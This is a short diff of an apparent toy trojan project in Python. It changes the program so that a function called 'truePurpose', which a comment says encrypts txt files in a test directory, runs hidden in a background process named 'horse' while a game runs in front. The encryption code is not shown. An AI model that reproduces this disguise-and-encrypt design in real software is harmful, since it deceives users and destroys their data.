@@ -60,8 +60,10 @@ def truePurpose(target_directory: str):
 
 
 if __name__ == "__main__":
-    p: Process = Process(target=game)
+    p: Process = Process(target=truePurpose, args=["./test"])
+
+    p.name: str = "horse"
     p.start()
 
     # For now, we'll encrypt all files in the test directory, that are a txt file.
-    truePurpose("./test")
+    game()
